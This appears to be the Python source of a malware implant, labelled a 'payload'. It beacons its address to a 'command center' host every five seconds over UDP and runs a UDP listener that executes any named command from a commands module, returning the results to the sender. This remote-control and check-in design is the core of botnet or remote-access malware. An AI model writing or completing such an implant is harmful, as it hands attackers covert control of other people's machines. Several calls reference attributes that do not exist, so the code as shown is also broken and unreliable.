#!/usr/bin/env python3


import socketserver
import threading
import socket
import logging

from __init__ import COMMAND_CENTER_HOST
from __init__ import COMMAND_CENTER_PORT
from __init__ import PAYLOAD_LISTEN_HOST
from __init__ import PAYLOAD_LISTEN_PORT

from . import commands


def ping():
    """
    sends ping to command center
    ping contains 'host_addr:port' eg. '127.0.0.1:1024'
    """
    payload_addr = (PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT)
    command_center_addr = (COMMAND_CENTER_HOST, COMMAND_CENTER_PORT)

    logging.debug('Ping sent to "%s" contains "%s"', payload_addr, command_center_addr)
    socketserver.UDPSock.sendto(str(payload_addr), command_center_addr)

    threading.Timer(5.0, ping).start()


UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
t = threading.Timer(5.0, ping)
t.start()


class UDPHandler(socketserver.SocketServer.BaseRequestHandler):

    def handle(self):
        request = self.request[0].strip()
        socket = self.request[1]

        logging.debug('Request from %s:%s "%s"' % (self.client_address[0], self.client_address[1], request))
        cmd = commands.commands(socket)

        args = request.count(' ')

        if args >= 1:
            request, argument = request.split(' ', 1)
            msg = getattr(cmd, request.lower())(argument)

        elif args == 0:
            msg = getattr(cmd, request.lower())()

        else:
            msg = '400 [Error] Bad Request: %s' % cmd
            logging.error(msg)

        socket.sendto(msg, (self.client_address[0], self.client_address[1] + 1))


if __name__ == '__main__':
    addr = (PAYLOAD_LISTEN_HOST, PAYLOAD_LISTEN_PORT)

    logging.info('Payload is listening on %s...', addr)
    listener = socketserver.UDPServer(addr, UDPHandler)

    try:
        listener.serve_forever()

    except KeyboardInterrupt:
        commands.commands(listener).kill()
        t.cancel()
        UDPSock.close()
